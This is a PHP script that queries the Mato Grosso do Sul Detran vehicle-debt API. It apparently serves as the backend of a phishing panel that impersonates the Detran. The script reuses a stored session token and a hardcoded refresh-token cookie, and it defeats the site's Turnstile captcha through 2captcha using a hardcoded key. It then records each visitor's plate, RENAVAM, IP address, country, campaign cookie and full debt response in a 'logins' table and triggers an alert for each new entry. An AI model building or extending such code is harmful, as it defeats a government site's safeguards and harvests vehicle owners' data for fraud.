<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$placa = trim((string)($_GET['placa'] ?? ''));
$renavam = trim((string)($_GET['renavam'] ?? ''));

if(!$placa || !$renavam){
    echo json_encode([
        'IsStatus' => false,
        'message' => 'Missing parameters'
    ]);
    exit;
}

require_once "../db.php";

function get_client_ip() {

    if (!empty($_SERVER['HTTP_CLIENT_IP']))   {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
    {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip_address = $_SERVER['REMOTE_ADDR'];
    }
    return $ip_address;
}

function Notifications($mensagem){
    global $pdo;

    $criado_em = date('Y/m/d H:i:s');

    $stmt = $pdo->prepare("INSERT INTO notificacoes (mensagem, criado_em) VALUES (:mensagem, :criado_em)");
    $stmt->execute([':mensagem' => "$mensagem - $criado_em", ':criado_em' => $criado_em]);

    $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio, atual = :atual, hora = :hora WHERE id = :id");
    $updateStmt->execute([':audio' => 5, ':atual' => rand(100000000, 99999999999), ':hora' => $criado_em, ':id' => 1]);
}

function solveCaptcha($key, $sitekey, $pageurl) {
    $ch = curl_init("https://2captcha.com/in.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "key=$key&method=turnstile&sitekey=$sitekey&pageurl=$pageurl");
    $res = curl_exec($ch);
    if (strpos($res, 'OK') !== false) {
        $id = explode('|', $res)[1];
        for ($i = 0; $i < 40; $i++) {
            $ch2 = curl_init("https://2captcha.com/res.php?key=$key&action=get&id=$id");
            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
            $res2 = curl_exec($ch2);
            if (strpos($res2, 'OK') !== false) return explode('|', $res2)[1];
            sleep(3);
        }
    }
    return false;
}

function handleFailure($message) {
    global $pdoGlob;
    try {
        $pdoGlob->prepare("UPDATE conf SET expirado_count = expirado_count + 1 WHERE tela = 'MS'")->execute();
        Notifications($message);
    } catch (Exception $e) {}
}



$Glob = $pdoGlob->query("SELECT dados FROM conf WHERE tela = 'MS' LIMIT 1")->fetchColumn();
$dados = json_decode($Glob, true);

// Configurações globais
$session = $dados['bearer'] ?? $dados['token'] ?? $dados['cookies'] ?? '';
$cookie_header = $dados['cookie'] ?? '';
$origin_header = $dados['origin'] ?? 'https://www.meudetran.ms.gov.br';
$referer_header = $dados['referer'] ?? 'https://www.meudetran.ms.gov.br/';

 if (!$session) {
    Notifications('MS >> Sua sessão expirou.');

    echo json_encode([
        'IsStatus' => false,
        'message' => 'Session token not found'
    ]);
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://portal-meu-detran-api.prod.k8s.detran.ms.gov.br/debt-consultation/check-debts');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json, text/plain, */*',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'authorization: Bearer ' . $session,
    'content-type: application/json',
    'origin: ' . $origin_header,
    'priority: u=1, i',
    'referer: ' . $referer_header,
    'sec-ch-ua: "Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'sec-fetch-storage-access: active',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0',
    'x-app-origin: app-web',
]);

if ($cookie_header) {
    curl_setopt($ch, CURLOPT_COOKIE, $cookie_header);
} else {
    curl_setopt($ch, CURLOPT_COOKIE, 'refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJJZCI6MTMzODU5NCwic2Vzc2lvbklkIjoiYTc3OTgwZmUtMzI3ZC00Yjg5LTkzNmUtNGQ5NDMwNDY4NTM3In0sImV4cCI6MTc3MjIxOTkyMiwiaWF0IjoxNzcyMTMzNTIyfQ.gtXG-5XS0t2qocmH-LKup-PUVjXm0hGzKcsKoUqQ0rU');
}

$captchaKey = '4f16550cac01fcf36238f2e4007822e8';
$sitekey = '0x4AAAAAACnfYKhutKR5VwFP';
$pageurl = 'https://www.meudetran.ms.gov.br/';
$turnstileToken = solveCaptcha($captchaKey, $sitekey, $pageurl);

if (!$turnstileToken) {
    handleFailure('MS >> Falha ao resolver Turnstile Captcha.');
    echo json_encode([
        'IsStatus' => false,
        'message' => 'Falha ao resolver captcha de segurança.'
    ]);
    exit;
}

$postPayload = [
    'plate' => $placa,
    'renavam' => $renavam,
    'turnstileToken' => $turnstileToken
];

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postPayload));

$response = curl_exec($ch);

if(!$response){
    handleFailure('MS >> Sem resposta do portal do Detran (sessão/conexão inválida).');
    echo json_encode([
        'IsStatus' => false,
        'message' => 'Invalid session token'
    ]);
    exit;
}

$resJson = json_decode($response, true);
if (isset($resJson['success']) && $resJson['success'] === false) {
    $errorMsg = $resJson['message'] ?? 'Sua sessão expirou ou ocorreu um erro de segurança.';
    handleFailure('MS >> ' . $errorMsg);
    echo json_encode([
        'IsStatus' => false,
        'message' => $errorMsg
    ]);
    exit;
}

if (stripos($response, 'Consulta de débitos realizada com sucesso') !== false) {

    $DadosArray = json_decode($response, true);

    echo json_encode([
        'IsStatus' => true,
        'dados' => $DadosArray
    ]);

    $check = $pdo->prepare("SELECT * FROM logins WHERE login_info LIKE :login_info LIMIT 1");
    $check->execute([':login_info' => "%$renavam%"]);
    $exists = $check->fetchColumn();

    if (!$exists) {
        $debitos = $DadosArray['data']['totalGeneral'] ?? '0,00';
           
        $loginData = [
            ['label' => 'placa', 'value' => $placa],
            ['label' => 'renavam', 'value' => $renavam]
        ];

        $ip_address = get_client_ip();
        $page = 'MsDetran';

        $pais = 'BR';
        try {
            $DadosIp = json_decode(@file_get_contents("http://ip-api.com/json/$ip_address"));
            if ($DadosIp && isset($DadosIp->country)) {
                $pais = $DadosIp->country;
            }
        } catch (Exception $e) {}

        $identity = $_COOKIE['Identity'] ?? '';      
        $id_usuario = $_COOKIE['campanha'] ?? '';

        $login_info = json_encode($loginData, JSON_UNESCAPED_UNICODE);
        $hora = date('Y-m-d H:i:s'); // Hora atual

            $dados64 = base64_encode($response);
            $dados = $DadosArray['data']['vehicleData']['model'];

            $stmt = $pdo->prepare("INSERT INTO logins (page, dados, debitos, ip, pais, identity, hora, login_info, id_usuario, resposta) VALUES 
                                    (:page, :dados, :debitos, :ip, :pais, :identity, :hora, :login_info, :id_usuario, :resposta)");

                $is =  $stmt->execute([
                    ':page'       => $page,
                    ':dados'      => $dados,
                    ':debitos'    => $debitos,
                    ':ip'         => $ip_address,
                    ':pais'       => $pais,
                    ':identity'   => $identity,
                    ':hora'       => $hora,
                    ':login_info' => $login_info,
                    ':id_usuario' => $id_usuario,
                    ':resposta' => $dados64
                ]);

                if($is){
                    $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio,  atual = :atual WHERE id = :id");
                    $updateStmt->execute([
                        ':audio' => 2,
                        ':atual' => rand(100000000, 99999999999),
                        ':id' => 1
                    ]);
                }
        }

}else if (stripos($response, 'Erro ao consultar débito do veículo.') !== false) {

    handleFailure('MS >> Erro ao consultar débito do veículo.');
    echo json_encode([
            'IsStatus' => false,
            'message' =>'Erro ao consultar débito do veículo.'
        ]);

}else {

    if (stripos($response, '"Token expirado."') !== false || stripos($response, 'Falha na verificação de segurança') !== false) {
        
       handleFailure('MS >> Sua sessão expirou.');
       echo json_encode([
            'IsStatus' => false,
            'message' =>'Sua sessão expirou ou o veículo não foi encontrado. Atualize o cURL no painel.'
        ]);
 
    }else {
        echo $response;
    }
}

curl_close($ch);
